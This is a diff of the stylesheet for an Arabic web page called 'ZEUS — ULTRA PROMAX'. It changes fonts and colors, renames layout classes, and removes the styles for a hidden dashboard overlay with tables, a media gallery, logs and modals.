@@ -2,14 +2,13 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-    <title>ZEUS — ULTRA PROMAX V4.7</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>ZEUS — ULTRA PROMAX</title>
     <link rel="preconnect" href="https://fonts.googleapis.com" />
-    <link href="https://fonts.googleapis.com/css2?family=Amiri:wght@400;700&family=Inter:wght@300;400;500;600;700;800;900&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Zain:wght@300;400;600;700;800;900&display=swap" rel="stylesheet" />
     <style>
-        *,
-        *::before,
-        *::after {
+        *, *::before, *::after {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
@@ -17,107 +16,62 @@
 
         :root {
             --bg-body: #f5f0e8;
-            --bg-panel: rgba(255, 253, 249, 0.88);
-            --bg-card: rgba(248, 244, 237, 0.78);
-            --bg-input: rgba(240, 235, 225, 0.72);
+            --bg-panel: rgba(255, 253, 249, 0.9);
+            --bg-card: rgba(248, 244, 237, 0.82);
+            --bg-input: rgba(240, 235, 225, 0.78);
             --ink: #1e1c18;
             --ink-2: #4a4640;
-            --ink-faint: #8a8478;
+            --ink-faint: #7c766a;
             --gold: #b8942e;
-            --gold-deep: #9f7d25;
+            --gold-deep: #96761e;
             --gold-light: #d9b84a;
             --gold-soft: rgba(184, 148, 46, 0.14);
-            --gold-glow: rgba(184, 148, 46, 0.22);
-            --gold-shimmer: linear-gradient(135deg, #b8942e 0%, #d9b84a 40%, #b8942e 70%, #9f7d25 100%);
-            --line: rgba(184, 148, 46, 0.14);
+            --gold-shimmer: linear-gradient(135deg, #b8942e 0%, #d9b84a 45%, #9f7d25 100%);
+            --line: rgba(184, 148, 46, 0.16);
             --success: #1a8a4a;
             --danger: #d93025;
-            --radius-card: 24px;
-            --radius-btn: 14px;
-            --transition: all 0.35s cubic-bezier(0.22, 1, 0.36, 1);
-            --font-ar: 'Amiri', serif;
-            --font-en: 'Inter', sans-serif;
-            --shadow-dash: 0 20px 60px rgba(0, 0, 0, 0.32), 0 0 80px rgba(184, 148, 46, 0.08);
-            --sidebar-width: 260px;
+            --radius-card: 22px;
+            --radius-input: 15px;
+            --font-main: 'Zain', sans-serif;
+            --transition: all 0.28s cubic-bezier(0.22, 1, 0.36, 1);
         }
 
         [data-theme="dark"] {
-            --bg-body: #100e0c;
-            --bg-panel: rgba(22, 20, 17, 0.95);
-            --bg-card: rgba(36, 33, 28, 0.78);
-            --bg-input: rgba(46, 42, 36, 0.75);
-            --ink: #ede8de;
-            --ink-2: #b8b0a4;
-            --ink-faint: #7a7264;
-            --line: rgba(184, 148, 46, 0.12);
-            --gold-soft: rgba(184, 148, 46, 0.12);
+            --bg-body: #110f0d;
+            --bg-panel: rgba(24, 21, 18, 0.96);
+            --bg-card: rgba(38, 34, 29, 0.84);
+            --bg-input: rgba(48, 43, 37, 0.82);
+            --ink: #f0ebe1;
+            --ink-2: #c2b9aa;
+            --ink-faint: #877f71;
+            --line: rgba(184, 148, 46, 0.14);
+            --gold-soft: rgba(184, 148, 46, 0.13);
         }
 
         body {
             background: var(--bg-body);
             color: var(--ink);
-            font-family: var(--font-ar);
+            font-family: var(--font-main);
+            font-size: 16px;
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
             padding: 20px;
-            line-height: 1.6;
-            position: relative;
-            overflow-x: hidden;
+            line-height: 1.65;
             transition: background 0.3s, color 0.3s;
         }
 
-        body::before {
-            content: '';
-            position: fixed;
-            inset: 0;
-            background:
-                radial-gradient(ellipse at 20% 50%, rgba(184, 148, 46, 0.07) 0%, transparent 60%),
-                radial-gradient(ellipse at 80% 50%, rgba(184, 148, 46, 0.06) 0%, transparent 60%),
-                radial-gradient(ellipse at 50% 0%, rgba(184, 148, 46, 0.05) 0%, transparent 45%);
-            pointer-events: none;
-            z-index: 0;
-        }
-
         .panel {
-            max-width: 900px;
+            max-width: 880px;
             width: 100%;
             background: var(--bg-panel);
-            backdrop-filter: blur(20px);
-            -webkit-backdrop-filter: blur(20px);
+            backdrop-filter: blur(18px);
             border-radius: var(--radius-card);
-            border: 1px solid rgba(184, 148, 46, 0.18);
-            padding: 32px 36px 28px;
-            box-shadow: 0 12px 48px rgba(0, 0, 0, 0.08), 0 4px 16px rgba(0, 0, 0, 0.03), inset 0 1px 0 rgba(255, 255, 255, 0.5);
-            position: relative;
-            z-index: 1;
-            opacity: 0;
-            animation: fadeUp .75s cubic-bezier(0.22, 1, 0.36, 1) forwards;
-            transition: background 0.3s, border-color 0.3s;
+            border: 1px solid var(--line);
+            padding: 30px 34px;
+            box-shadow: 0 14px 44px rgba(0, 0, 0, 0.08);
         }
-
-        [data-theme="dark"] .panel {
-            border-color: rgba(184, 148, 46, 0.14);
-            box-shadow: 0 12px 48px rgba(0, 0, 0, 0.45);
-        }
-
-        .panel::after {
-            content: '';
-            position: absolute;
-            inset: 4px;
-            border-radius: calc(var(--radius-card) - 4px);
-            border: 1px solid rgba(184, 148, 46, 0.07);
-            pointer-events: none;
-        }
-
-        @keyframes fadeUp {
-            from { opacity: 0; transform: translateY(20px) scale(0.985); }
-            to { opacity: 1; transform: translateY(0) scale(1); }
-        }
-
-        @media (max-width: 640px) { .panel { padding: 20px 18px 18px; } }
-        @media (max-width: 420px) { .panel { padding: 16px 14px 14px; } }
 
         .top {
             display: flex;
@@ -125,146 +79,109 @@
             justify-content: space-between;
             border-bottom: 2px solid var(--line);
             padding-bottom: 18px;
+            gap: 14px;
             flex-wrap: wrap;
-            gap: 12px;
-            position: relative;
         }
 
-        .top::after {
-            content: '';
-            position: absolute;
-            bottom: -2px;
-            right: 0;
-            width: 90px;
-            height: 2px;
-            background: var(--gold-shimmer);
-            border-radius: 2px;
-            animation: shimmerLine 3s ease-in-out infinite;
-        }
-
-        @keyframes shimmerLine {
-            0%, 100% { opacity: 0.45; width: 65px; }
-            50% { opacity: 1; width: 130px; }
-        }
-
-        .brand {
-            display: flex;
+        .brand-lock-btn {
+            display: inline-flex;
             align-items: center;
             gap: 14px;
+            background: none;
+            border: none;
             cursor: pointer;
+            padding: 4px 6px;
+            border-radius: 16px;
+            transition: var(--transition);
             user-select: none;
         }
 
-        .logo {
-            width: 56px;
-            height: 56px;
+        .brand-lock-btn:hover {
+            background: var(--gold-soft);
+        }
+
+        .zeus-emblem {
+            width: 58px;
+            height: 58px;
             flex-shrink: 0;
-            position: relative;
         }
 
-        .logo svg {
-            width: 100%;
-            height: 100%;
-            filter: drop-shadow(0 2px 12px rgba(184, 148, 46, 0.18));
-        }
-
-        .logo .pulse {
-            animation: pulseMark 2.2s ease-in-out infinite;
-            transform-origin: center;
-        }
-
-        @keyframes pulseMark {
-            0%, 100% { transform: scale(1); opacity: 0.35; }
-            50% { transform: scale(1.08); opacity: 0.9; }
-        }
-
-        .logo .glow-ring {
-            animation: glowRing 3s ease-in-out infinite;
-            transform-origin: center;
-        }
-
-        @keyframes glowRing {
-            0%, 100% { opacity: 0.4; transform: scale(1); }
-            50% { opacity: 0.9; transform: scale(1.04); }
-        }
-
-        .name {
-            font-family: var(--font-ar);
+        .brand-title {
             font-size: 32px;
-            letter-spacing: 6px;
+            font-weight: 900;
+            letter-spacing: 3px;
             background: var(--gold-shimmer);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
-            background-clip: text;
-            font-weight: 700;
-            user-select: none;
-            transition: var(--transition);
+            line-height: 1.1;
         }
 
-        .name-tag {
-            font-family: var(--font-en);
-            font-size: 10px;
-            font-weight: 700;
-            letter-spacing: 1.5px;
-            color: var(--gold);
-            background: var(--gold-soft);
-            border: 1px solid var(--line);
-            padding: 2px 8px;
-            border-radius: 20px;
-            margin-right: 6px;
-        }
-
-        .info {
-            text-align: left;
+        .brand-sub {
+            display: block;
             font-size: 13px;
-            color: var(--ink-2);
+            font-weight: 600;
+            color: var(--ink-faint);
+            text-align: right;
+        }
+
+        .meta-bar {
             display: flex;
             align-items: center;
-            gap: 12px;
+            gap: 10px;
             flex-wrap: wrap;
         }
 
-        .info .row {
-            display: flex;
+        .meta-pill {
+            display: inline-flex;
             align-items: center;
-            gap: 6px;
-            font-family: var(--font-en);
-            font-size: 12px;
-            color: var(--ink-faint);
-            padding: 4px 10px 4px 8px;
-            background: rgba(255, 255, 255, 0.45);
-            border-radius: 30px;
-            border: 1px solid rgba(184, 148, 46, 0.08);
+            gap: 8px;
+            padding: 6px 14px;
+            border-radius: 999px;
+            background: var(--bg-card);
+            border: 1px solid var(--line);
+            font-size: 14px;
+            font-weight: 700;
+            color: var(--ink-2);
+            font-variant-numeric: tabular-nums;
         }
 
-        [data-theme="dark"] .info .row { background: rgba(255, 255, 255, 0.05); }
-
-        .info .row .icon {
-            width: 15px;
-            height: 15px;
+        .meta-pill svg {
+            width: 18px;
+            height: 18px;
             stroke: var(--gold);
             fill: none;
-            stroke-width: 1.8;
+            stroke-width: 2;
             flex-shrink: 0;
         }
 
-        .theme-toggle {
-            background: none;
-            border: 1px solid var(--line);
-            border-radius: 30px;
-            padding: 4px 12px;
-            cursor: pointer;
-            color: var(--ink-2);
-            font-family: var(--font-en);
-            font-size: 12px;
-            display: flex;
+        .theme-btn {
+            display: inline-flex;
             align-items: center;
-            gap: 6px;
+            gap: 7px;
+            padding: 6px 14px;
+            border-radius: 999px;
+            background: var(--bg-card);
+            border: 1px solid var(--line);
+            color: var(--ink-2);
+            font-family: var(--font-main);
+            font-size: 14px;
+            font-weight: 700;
+            cursor: pointer;
             transition: var(--transition);
         }
 
-        .theme-toggle:hover { border-color: var(--gold); color: var(--gold); }
-        .theme-toggle svg { width: 16px; height: 16px; stroke: currentColor; fill: none; stroke-width: 1.8; }
+        .theme-btn:hover {
+            border-color: var(--gold);
+            color: var(--gold);
+        }
+
+        .theme-btn svg {
+            width: 18px;
+            height: 18px;
+            stroke: currentColor;
+            fill: none;
+            stroke-width: 2;
+        }
 
         .grid {
             display: grid;
@@ -273,2953 +190,682 @@
             margin-top: 22px;
         }
 
-        @media (max-width: 640px) { .grid { grid-template-columns: 1fr; gap: 14px; } }
+        @media (max-width: 640px) {
+            .panel { padding: 20px 16px; }
+            .grid { grid-template-columns: 1fr; gap: 14px; }
+        }
 
         .card {
             background: var(--bg-card);
-            backdrop-filter: blur(8px);
-            -webkit-backdrop-filter: blur(8px);
             border-radius: var(--radius-card);
-            padding: 20px 22px 18px;
-            border: 1px solid rgba(184, 148, 46, 0.09);
-            transition: var(--transition);
-            position: relative;
-            overflow: hidden;
+            padding: 20px;
+            border: 1px solid var(--line);
+            margin-top: 18px;
         }
 
-        .card:hover {
-            border-color: rgba(184, 148, 46, 0.24);
-            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.05);
-            transform: translateY(-2px);
+        .grid .card {
+            margin-top: 0;
         }
 
-        .card .label-wrap {
+        .card-head {
             display: flex;
             align-items: center;
             justify-content: space-between;
-            gap: 10px;
-            margin-bottom: 10px;
-        }
-
-        .card .label-left { display: flex; align-items: center; gap: 10px; }
-        .card .label-wrap svg { width: 17px; height: 17px; stroke: var(--gold); fill: none; stroke-width: 1.8; flex-shrink: 0; }
-
-        .card .label {
-            font-family: var(--font-en);
-            font-size: 10px;
-            font-weight: 700;
-            text-transform: uppercase;
-            letter-spacing: 2.2px;
-            color: var(--ink-faint);
-        }
-
-        .card .input-wrap {
-            display: flex;
-            align-items: center;
-            background: var(--bg-input);
-            border-radius: 16px;
-            padding: 0 14px;
-            margin-top: 2px;
-            border: 1px solid rgba(184, 148, 46, 0.08);
-            transition: var(--transition);
-        }
-
-        .card .input-wrap:focus-within {
-            border-color: var(--gold);
-            box-shadow: 0 0 0 4px var(--gold-soft), inset 0 0 0 1px var(--gold);
-        }
-
-        .card .input-wrap input {
-            flex: 1;
-            border: none;
-            outline: none;
-            background: transparent;
-            padding: 13px 0;
-            font-family: var(--font-en);
-            font-size: 14px;
-            font-weight: 500;
-            color: var(--ink);
-            direction: ltr;
-            text-align: right;
-            letter-spacing: 0.5px;
-            min-width: 0;
-        }
-
-        .card .input-wrap input::placeholder {
-            color: var(--ink-faint);
-            letter-spacing: normal;
-            font-weight: 400;
-            opacity: 0.7;
-        }
-
-        .toggle-group {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 10px;
-            margin-top: 6px;
-        }
-
-        @media (max-width: 560px) { .toggle-group { grid-template-columns: repeat(2, 1fr); gap: 8px; } }
-
-        .zeus-toggle {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            background: var(--bg-input);
-            padding: 8px 14px;
-            border-radius: 14px;
-            border: 1px solid rgba(184, 148, 46, 0.07);
-            cursor: pointer;
-            transition: var(--transition);
-            min-height: 44px;
-            gap: 8px;
-            position: relative;
-        }
-
-        .zeus-toggle:hover { border-color: rgba(184, 148, 46, 0.22); transform: translateY(-1px); }
-        .zeus-toggle input { position: absolute; opacity: 0; width: 0; height: 0; }
-
-        .zeus-toggle .toggle-label {
-            font-family: var(--font-ar);
-            font-size: 13px;
-            font-weight: 500;
-            color: var(--ink-2);
-            transition: var(--transition);
-            flex: 1;
-            display: flex;
-            align-items: center;
-            gap: 6px;
-        }
-
-        .zeus-toggle .toggle-label svg {
-            width: 15px;
-            height: 15px;
-            stroke: var(--ink-faint);
-            fill: none;
-            stroke-width: 1.8;
-            flex-shrink: 0;
-            transition: var(--transition);
-        }
-
-        .zeus-toggle .track {
-            width: 36px;
-            height: 22px;
-            background: #d5d0c6;
-            border-radius: 30px;
-            position: relative;
-            transition: var(--transition);
-            flex-shrink: 0;
-        }
-
-        [data-theme="dark"] .zeus-toggle .track { background: #4a4640; }
-
-        .zeus-toggle .track .thumb {
-            width: 16px;
-            height: 16px;
-            background: #fff;
-            border-radius: 50%;
-            position: absolute;
-            top: 3px;
-            right: 3px;
-            transition: var(--transition);
-            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.15);
-        }
-
-        .zeus-toggle input:checked + .toggle-label { color: var(--ink); font-weight: 600; }
-        .zeus-toggle input:checked + .toggle-label svg { stroke: var(--gold); }
-        .zeus-toggle input:checked ~ .track { background: var(--gold-shimmer); }
-        .zeus-toggle input:checked ~ .track .thumb { right: 17px; }
-
-        .generate-wrap {
-            display: flex;
-            justify-content: center;
-            margin: 24px 0 20px 0;
-            position: relative;
-        }
-
-        .btn-generate {
-            display: inline-flex;
-            align-items: center;
-            gap: 12px;
-            padding: 14px 40px;
-            background: var(--gold-shimmer);
-            border: none;
-            border-radius: 50px;
-            cursor: pointer;
-            font-family: var(--font-ar);
-            font-size: 16px;
-            font-weight: 700;
-            color: #fff;
-            letter-spacing: 0.5px;
-            box-shadow: 0 4px 28px rgba(184, 148, 46, 0.32), inset 0 1px 0 rgba(255, 255, 255, 0.25);
-            transition: var(--transition);
-            position: relative;
-            overflow: hidden;
-        }
-
-        .btn-generate:hover {
-            transform: translateY(-2px) scale(1.015);
-            box-shadow: 0 8px 36px rgba(184, 148, 46, 0.42);
-        }
-
-        .btn-generate svg { width: 20px; height: 20px; stroke: currentColor; fill: none; stroke-width: 2; flex-shrink: 0; }
-        .btn-generate.busy { opacity: 0.75; pointer-events: none; }
-        .btn-generate.done {
-            background: linear-gradient(135deg, #1a8a4a, #126a38);
-            box-shadow: 0 4px 28px rgba(26, 138, 74, 0.32);
-        }
-
-        .result-section { margin-bottom: 22px; }
-
-        .result-section .label-wrap {
-            display: flex;
-            align-items: center;
-            gap: 10px;
             margin-bottom: 12px;
         }
 
-        .result-section .label-wrap svg { width: 17px; height: 17px; stroke: var(--gold); fill: none; stroke-width: 1.8; }
-
-        .result-section .section-title {
-            font-family: var(--font-en);
-            font-size: 10px;
-            font-weight: 700;
-            text-transform: uppercase;
-            letter-spacing: 2.2px;
-            color: var(--ink-faint);
-        }
-
-        .result {
+        .card-title-wrap {
             display: flex;
             align-items: center;
-            justify-content: space-between;
-            background: var(--bg-card);
-            border-radius: var(--radius-card);
-            padding: 16px 22px;
-            border: 1px solid rgba(184, 148, 46, 0.09);
-            flex-wrap: wrap;
-            gap: 12px;
-            transition: var(--transition);
+            gap: 10px;
         }
 
-        .result .info-box { display: flex; flex-direction: column; flex: 1; min-width: 140px; }
-
-        .result .info-box .value {
-            font-family: var(--font-en);
-            font-size: 20px;
-            font-weight: 800;
-            letter-spacing: 1.5px;
-            background: var(--gold-shimmer);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-            display: inline-block;
-            width: fit-content;
-        }
-
-        .result .info-box .sub {
-            font-family: var(--font-en);
-            font-size: 11px;
-            color: var(--ink-faint);
-            margin-top: 3px;
-            word-break: break-all;
-        }
-
-        .result .actions { display: flex; gap: 10px; flex-shrink: 0; }
-
-        .result .actions button {
-            width: 42px;
-            height: 42px;
-            border-radius: 14px;
-            border: 1px solid rgba(184, 148, 46, 0.1);
-            background: rgba(255, 255, 255, 0.45);
-            color: var(--ink-2);
-            cursor: pointer;
-            transition: var(--transition);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        [data-theme="dark"] .result .actions button { background: rgba(255, 255, 255, 0.05); }
-        .result .actions button svg { width: 18px; height: 18px; stroke: currentColor; fill: none; stroke-width: 1.8; }
-        .result .actions button:hover { transform: translateY(-2px); border-color: var(--gold); color: var(--gold); }
-        .result .actions button.ok { border-color: var(--success); background: var(--success); color: #fff; }
-
-        .footer {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 12px;
-            padding-top: 18px;
-            border-top: 2px solid var(--line);
-            font-family: var(--font-ar);
-            font-size: 17px;
-            font-weight: 700;
-            cursor: pointer;
-            transition: var(--transition);
-            flex-wrap: wrap;
-        }
-
-        .footer .dev-name {
-            letter-spacing: 3px;
-            font-size: 20px;
-            background: var(--gold-shimmer);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-        }
-
-        .footer .icon-badge { width: 22px; height: 22px; display: flex; align-items: center; justify-content: center; }
-        .footer .icon-badge svg { width: 100%; height: 100%; stroke: var(--gold); fill: none; stroke-width: 1.8; }
-
-        /* ===== DASHBOARD ===== */
-        .dash-overlay {
-            position: fixed;
-            inset: 0;
-            z-index: 9999;
-            background: rgba(10, 8, 6, 0.78);
-            backdrop-filter: blur(24px);
-            -webkit-backdrop-filter: blur(24px);
-            display: none;
-            align-items: flex-start;
-            justify-content: center;
-            padding: 16px;
-            overflow-y: auto;
-        }
-
-        .dash-overlay.active { display: flex; }
-
-        .dash-container {
-            width: 100%;
-            max-width: 1400px;
-            background: var(--bg-panel);
-            border-radius: var(--radius-card);
-            border: 1px solid rgba(184, 148, 46, 0.16);
-            box-shadow: var(--shadow-dash);
-            position: relative;
-            max-height: 96vh;
-            overflow: hidden;
-            display: flex;
-            flex-direction: column;
-        }
-
-        .dash-header-bar {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding: 16px 24px;
-            border-bottom: 1px solid var(--line);
-            flex-wrap: wrap;
-            gap: 12px;
-        }
-
-        .dash-header-bar .dash-title {
-            font-family: var(--font-ar);
-            font-size: 26px;
-            font-weight: 700;
-            background: var(--gold-shimmer);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-            letter-spacing: 3px;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
-
-        .dash-header-bar .dash-title small {
-            font-size: 12px;
-            font-weight: 400;
-            color: var(--ink-faint);
-            -webkit-text-fill-color: var(--ink-faint);
-            font-family: var(--font-en);
-        }
-
-        .dash-header-actions { display: flex; align-items: center; gap: 10px; flex-wrap: wrap; }
-
-        .dash-header-actions button {
-            background: none;
-            border: 1px solid var(--line);
-            border-radius: 30px;
-            padding: 6px 16px;
-            cursor: pointer;
-            color: var(--ink-2);
-            font-family: var(--font-en);
-            font-size: 12px;
-            font-weight: 500;
-            transition: var(--transition);
-            display: flex;
-            align-items: center;
-            gap: 6px;
-        }
-
-        .dash-header-actions button:hover { border-color: var(--gold); color: var(--gold); }
-
-        .dash-body { display: flex; flex: 1; overflow: hidden; min-height: 420px; }
-
-        .dash-sidebar {
-            width: var(--sidebar-width);
-            background: rgba(184, 148, 46, 0.04);
-            border-left: 1px solid var(--line);
-            padding: 16px 12px;
-            overflow-y: auto;
+        .card-title-wrap svg {
+            width: 20px;
+            height: 20px;
+            stroke: var(--gold);
+            fill: none;
+            stroke-width: 2;
             flex-shrink: 0;
         }
 
-        .dash-sidebar .sidebar-label {
-            font-family: var(--font-en);
-            font-size: 10px;
-            font-weight: 700;
-            text-transform: uppercase;
-            letter-spacing: 1.5px;
-            color: var(--ink-faint);
-            padding: 8px 12px 4px;
-            display: block;
-        }
-
-        .dash-sidebar .nav-item {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            padding: 10px 14px;
-            border-radius: 12px;
-            cursor: pointer;
-            transition: var(--transition);
-            color: var(--ink-2);
-            font-family: var(--font-en);
-            font-size: 13px;
-            font-weight: 500;
-            margin-bottom: 2px;
-            border: none;
-            background: none;
-            width: 100%;
-            text-align: right;
-        }
-
-        .dash-sidebar .nav-item svg { width: 18px; height: 18px; stroke: currentColor; fill: none; stroke-width: 1.8; flex-shrink: 0; }
-        .dash-sidebar .nav-item:hover,
-        .dash-sidebar .nav-item.active { background: var(--gold-soft); color: var(--gold); font-weight: 600; }
-
-        .dash-sidebar .nav-item .badge-nav {
-            margin-right: auto;
-            background: var(--gold-soft);
-            color: var(--gold);
-            font-size: 10px;
-            font-weight: 700;
-            padding: 1px 10px;
-            border-radius: 20px;
-        }
-
-        .dash-content { flex: 1; padding: 20px 28px 24px; overflow-y: auto; min-width: 0; }
-        .dash-content .view { display: none; }
-        .dash-content .view.active { display: block; animation: fadeUp 0.25s ease; }
-
-        .dash-stats-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
-            gap: 14px;
-            margin-bottom: 24px;
-        }
-
-        .dash-stat-card {
-            background: var(--bg-card);
-            border-radius: var(--radius-card);
-            padding: 16px 20px;
-            border: 1px solid rgba(184, 148, 46, 0.09);
-        }
-
-        .dash-stat-card .stat-num {
-            font-size: 28px;
+        .card-title {
+            font-size: 16px;
             font-weight: 800;
-            background: var(--gold-shimmer);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-            display: inline-block;
-            font-family: var(--font-en);
+            color: var(--ink);
         }
 
-        .dash-stat-card .stat-label { font-size: 12px; color: var(--ink-faint); font-family: var(--font-en); margin-top: 2px; }
-
-        .dash-table-wrap {
-            background: var(--bg-card);
-            border-radius: var(--radius-card);
-            border: 1px solid rgba(184, 148, 46, 0.09);
-            overflow: hidden;
-            margin-bottom: 16px;
-        }
-
-        .dash-table-wrap .table-scroll { overflow-x: auto; padding: 2px; }
-
-        .dash-table-wrap table {
-            width: 100%;
-            border-collapse: collapse;
-            font-size: 13px;
-            min-width: 560px;
-        }
-
-        .dash-table-wrap table th {
-            background: rgba(184, 148, 46, 0.06);
-            color: var(--gold-deep);
-            font-weight: 600;
-            padding: 10px 14px;
-            text-align: right;
-            font-family: var(--font-en);
-            font-size: 11px;
-            text-transform: uppercase;
-            border-bottom: 1px solid var(--line);
-        }
-
-        .dash-table-wrap table td {
-            padding: 10px 14px;
-            border-bottom: 1px solid rgba(184, 148, 46, 0.05);
-            color: var(--ink-2);
-            vertical-align: middle;
-        }
-
-        .dash-table-wrap .empty-msg { padding: 24px; text-align: center; color: var(--ink-faint); font-size: 14px; }
-
-        .dash-gallery {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
-            gap: 12px;
-            padding: 8px 0;
-        }
-
-        .dash-gallery .gallery-item {
-            aspect-ratio: 1/1;
-            background: var(--bg-input);
-            border-radius: 12px;
-            border: 1px solid var(--line);
-            overflow: hidden;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-            transition: var(--transition);
-            position: relative;
-        }
-
-        .dash-gallery .gallery-item:hover { border-color: var(--gold); transform: scale(1.02); }
-        .dash-gallery .gallery-item img,
-        .dash-gallery .gallery-item video { width: 100%; height: 100%; object-fit: cover; }
-
-        .dash-gallery .gallery-item .file-label {
-            position: absolute;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            background: rgba(0, 0, 0, 0.65);
-            padding: 4px 6px;
-            font-size: 10px;
-            color: #fff;
-            text-align: center;
-            font-family: var(--font-en);
-            overflow: hidden;
-            white-space: nowrap;
-            text-overflow: ellipsis;
-        }
-
-        .dash-toolbar { display: flex; flex-wrap: wrap; gap: 12px; margin-bottom: 16px; align-items: center; }
-
-        .dash-toolbar .search-wrap {
-            flex: 1;
-            min-width: 180px;
+        .input-box {
             display: flex;
             align-items: center;
             background: var(--bg-input);
-            border-radius: 14px;
+            border-radius: var(--radius-input);
             padding: 0 14px;
-            border: 1px solid rgba(184, 148, 46, 0.08);
+            border: 1px solid var(--line);
+            transition: var(--transition);
         }
 
-        .dash-toolbar .search-wrap input {
+        .input-box:focus-within {
+            border-color: var(--gold);
+            box-shadow: 0 0 0 3px var(--gold-soft);
+        }
+
+        .input-box input {
             flex: 1;
             border: none;
             outline: none;
             background: transparent;
-            padding: 10px 0;
-            font-family: var(--font-en);
-            font-size: 13px;
+            padding: 12px 0;
+            font-family: var(--font-main);
+            font-size: 15px;
+            font-weight: 600;
             color: var(--ink);
             min-width: 0;
         }
 
-        .dash-toolbar .search-wrap svg { width: 16px; height: 16px; stroke: var(--ink-faint); fill: none; stroke-width: 1.8; flex-shrink: 0; }
-
-        .dash-toolbar .filter-select {
-            background: var(--bg-input);
-            border: 1px solid rgba(184, 148, 46, 0.08);
-            border-radius: 14px;
-            padding: 10px 14px;
-            font-family: var(--font-en);
-            font-size: 13px;
-            color: var(--ink);
-            outline: none;
-            min-width: 120px;
-        }
-
-        .detail-view {
-            background: var(--bg-card);
-            border-radius: var(--radius-card);
-            padding: 20px 24px;
-            border: 1px solid rgba(184, 148, 46, 0.09);
-            margin-bottom: 16px;
-        }
-
-        .detail-view .detail-row {
+        .action-row {
             display: flex;
-            flex-wrap: wrap;
-            gap: 8px 24px;
-            padding: 8px 0;
-            border-bottom: 1px solid var(--line);
-            align-items: center;
-        }
-
-        .detail-view .detail-row .label {
-            font-family: var(--font-en);
-            font-size: 11px;
-            font-weight: 600;
-            color: var(--ink-faint);
-            min-width: 110px;
-            text-transform: uppercase;
-        }
-
-        .detail-view .detail-row .value { font-family: var(--font-en); font-size: 14px; color: var(--ink); word-break: break-all; }
-
-        .log-entry {
-            display: flex;
-            gap: 12px;
-            padding: 8px 0;
-            border-bottom: 1px solid var(--line);
-            font-family: var(--font-en);
-            font-size: 13px;
-            color: var(--ink-2);
-            align-items: center;
-        }
-
-        .log-entry .log-time { color: var(--ink-faint); font-size: 11px; min-width: 68px; }
-
-        .log-entry .log-badge {
-            background: var(--gold-soft);
-            color: var(--gold);
-            font-size: 10px;
-            font-weight: 600;
-            padding: 1px 10px;
-            border-radius: 20px;
-        }
-
-        .log-entry .log-badge.danger { background: rgba(217, 48, 37, 0.12); color: var(--danger); }
-        .log-entry .log-badge.success { background: rgba(26, 138, 74, 0.12); color: var(--success); }
-
-        .code-modal, .dev-page {
-            display: none;
-            position: fixed;
-            inset: 0;
-            z-index: 99997;
-            background: rgba(10, 8, 6, 0.78);
-            backdrop-filter: blur(20px);
-            align-items: center;
             justify-content: center;
-            padding: 20px;
+            margin: 24px 0 20px;
         }
 
-        .code-modal.active, .dev-page.active { display: flex; }
-
-        .code-modal .modal-box, .dev-container {
-            max-width: 460px;
-            width: 100%;
-            background: var(--bg-panel);
-            border-radius: var(--radius-card);
-            border: 1px solid rgba(184, 148, 46, 0.16);
-            padding: 32px 28px 28px;
-            box-shadow: var(--shadow-dash);
-            position: relative;
-            max-height: 90vh;
-            overflow-y: auto;
-        }
-
-        .dev-container { max-width: 560px; }
-        .code-modal .modal-box { text-align: center; }
-
-        .modal-title, .dev-title {
-            font-family: var(--font-ar);
-            font-size: 24px;
-            font-weight: 700;
-            background: var(--gold-shimmer);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-            letter-spacing: 2px;
-            margin-bottom: 4px;
-            text-align: center;
-        }
-
-        .modal-sub, .dev-sub { color: var(--ink-faint); font-family: var(--font-en); font-size: 13px; margin-bottom: 20px; text-align: center; }
-
-        .code-modal .input-wrap {
-            display: flex;
+        .btn-primary {
+            display: inline-flex;
             align-items: center;
-            background: var(--bg-input);
-            border-radius: 16px;
-            padding: 0 16px;
-            border: 1px solid var(--line);
-            margin-bottom: 16px;
-        }
-
-        .code-modal .input-wrap input {
-            flex: 1;
+            gap: 10px;
+            padding: 13px 36px;
             border: none;
-            outline: none;
-            background: transparent;
-            padding: 13px 0;
-            font-family: var(--font-en);
-            font-size: 15px;
-            color: var(--ink);
-            direction: ltr;
-            text-align: center;
-        }
-
-        .modal-actions { display: flex; gap: 12px; justify-content: center; }
-
-        .modal-actions button {
-            padding: 10px 28px;
-            border-radius: 30px;
-            border: none;
-            font-family: var(--font-en);
-            font-size: 14px;
-            font-weight: 600;
+            border-radius: 999px;
+            background: var(--gold-shimmer);
+            color: #fff;
+            font-family: var(--font-main);
+            font-size: 17px;
+            font-weight: 800;
             cursor: pointer;
+            box-shadow: 0 6px 24px rgba(184, 148, 46, 0.28);
+            transition: var(--transition);
         }
 
-        .btn-confirm { background: var(--gold-shimmer); color: #fff; }
-        .btn-cancel { background: var(--bg-input); color: var(--ink-faint); border: 1px solid var(--line) !important; }
